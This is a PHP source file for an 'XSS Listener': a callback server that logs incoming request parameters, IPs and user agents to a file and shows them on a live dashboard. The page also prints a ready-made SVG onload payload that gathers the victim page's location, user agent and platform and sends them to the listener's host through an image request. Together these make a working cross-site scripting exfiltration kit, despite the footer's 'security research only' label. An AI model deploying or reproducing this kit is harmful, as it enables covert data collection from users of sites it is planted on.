<?php
// XSS Listener by [Your Name]
$LOG_FILE = 'log.txt';
$MAX_LOGS = 50;

// Log the request
if (!empty($_GET) || !empty($_POST)) {
    $entry = [
        'time' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'method' => $_SERVER['REQUEST_METHOD'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None',
        'get_params' => $_GET,
        'post_data' => $_POST
    ];
    
    $log_line = json_encode($entry) . PHP_EOL;
    file_put_contents($LOG_FILE, $log_line, FILE_APPEND);
    
    // Keep only recent logs
    $lines = file($LOG_FILE, FILE_IGNORE_NEW_LINES);
    if (count($lines) > $MAX_LOGS) {
        file_put_contents($LOG_FILE, implode(PHP_EOL, array_slice($lines, -$MAX_LOGS)) . PHP_EOL);
    }
}

// Display interface
?>
<!DOCTYPE html>
<html>
<head>
    <title>🎯 XSS Listener</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="15">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Consolas', 'Monaco', monospace; 
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
            color: #00ff00; 
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        header { text-align: center; margin-bottom: 30px; padding: 20px; border-bottom: 2px solid #00ff00; }
        h1 { font-size: 2.5em; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
        .subtitle { color: #66ff66; margin-top: 10px; }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 15px; 
            margin-bottom: 30px; 
        }
        .stat-box { 
            background: rgba(0, 255, 0, 0.1); 
            padding: 15px; 
            border-radius: 8px; 
            border: 1px solid #00ff00;
            text-align: center;
        }
        .log-container { 
            background: rgba(0, 0, 0, 0.8); 
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            max-height: 600px;
            overflow-y: auto;
        }
        .log-entry { 
            margin-bottom: 15px; 
            padding: 15px; 
            background: rgba(255, 0, 0, 0.1);
            border-left: 4px solid #ff0000;
            border-radius: 5px;
        }
        .time { color: #00ffff; font-weight: bold; }
        .ip { color: #ffff00; }
        .ua { color: #ff66ff; font-size: 0.9em; }
        .data { color: #66ff66; background: rgba(0, 0, 0, 0.5); padding: 10px; border-radius: 5px; margin-top: 10px; }
        footer { text-align: center; margin-top: 30px; color: #888; font-size: 0.9em; }
        .blink { animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎯 <span class="blink">LIVE</span> sensetive-listener</h1>
            <p class="subtitle">Endpoint: <?php echo 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?></p>
        </header>
        
        <div class="stats">
            <div class="stat-box">
                <h3>🕒 Status</h3>
                <p id="status">🟢 ACTIVE</p>
            </div>
            <div class="stat-box">
                <h3>📡 Total Hits</h3>
                <p><?php echo file_exists($LOG_FILE) ? count(file($LOG_FILE, FILE_IGNORE_NEW_LINES)) : '0'; ?></p>
            </div>
            <div class="stat-box">
                <h3>🔄 Auto-refresh</h3>
                <p>Every 15 seconds</p>
            </div>
            <div class="stat-box">
                <h3>🔗 Your URL</h3>
                <p><code id="url"><?php echo 'https://' . $_SERVER['HTTP_HOST']; ?></code></p>
            </div>
        </div>
        
        <div class="log-container">
            <h2>📊 Recent Activity (Last 50 requests):</h2>
            <?php
            if (file_exists($LOG_FILE)) {
                $lines = array_reverse(file($LOG_FILE, FILE_IGNORE_NEW_LINES));
                foreach ($lines as $line) {
                    $data = json_decode($line, true);
                    if ($data) {
                        echo '<div class="log-entry">';
                        echo '<div><span class="time">📅 ' . $data['time'] . '</span> | ';
                        echo '<span class="ip">📍 IP: ' . $data['ip'] . '</span> | ';
                        echo '<span class="method">⚡ ' . $data['method'] . '</span></div>';
                        echo '<div class="ua">🖥️ ' . htmlspecialchars(substr($data['user_agent'], 0, 100)) . '</div>';
                        if (!empty($data['get_params'])) {
                            echo '<div class="data">📤 GET: <code>' . htmlspecialchars(json_encode($data['get_params'])) . '</code></div>';
                        }
                        if (!empty($data['post_data'])) {
                            echo '<div class="data">📥 POST: <code>' . htmlspecialchars(json_encode($data['post_data'])) . '</code></div>';
                        }
                        echo '</div>';
                    }
                }
            } else {
                echo '<div class="log-entry">📭 No requests received yet. Waiting for SVG triggers...</div>';
            }
            ?>
        </div>
        
        <div class="log-container">
            <h2>🚀 SVG Payload to Use:</h2>
            <pre style="background: #000; padding: 15px; border-radius: 5px; color: #00ff00;">
&lt;svg xmlns="http://www.w3.org/2000/svg" onload="
  var data = {
    p: window.location.protocol,
    f: window.location.pathname,
    ua: navigator.userAgent,
    pl: navigator.platform,
    t: Date.now(),
    r: Math.random()
  };
  
  new Image().src = '<?php echo 'https://' . $_SERVER['HTTP_HOST']; ?>/?test=1&amp;' + 
    Object.keys(data).map(k => k + '=' + encodeURIComponent(data[k])).join('&amp;');
"&gt;
  &lt;circle cx="100" cy="100" r="80" fill="red"/&gt;
&lt;/svg&gt;</pre>
        </div>
        
        <footer>
            <p>🔒 For security research only | Last update: <?php echo date('Y-m-d H:i:s'); ?></p>
            <p>🔄 Page auto-refreshes every 15 seconds</p>
        </footer>
    </div>
    
    <script>
        // Auto-scroll to bottom of logs
        window.scrollTo(0, document.body.scrollHeight);
        
        // Update time every second
        function updateTime() {
            const now = new Date();
            document.getElementById('status').innerHTML = '🟢 ACTIVE - ' + now.toLocaleTimeString();
        }
        setInterval(updateTime, 1000);
        
        // Copy URL on click
        document.getElementById('url').onclick = function() {
            navigator.clipboard.writeText(this.textContent);
            alert('URL copied to clipboard!');
        };
    </script>
</body>
</html>
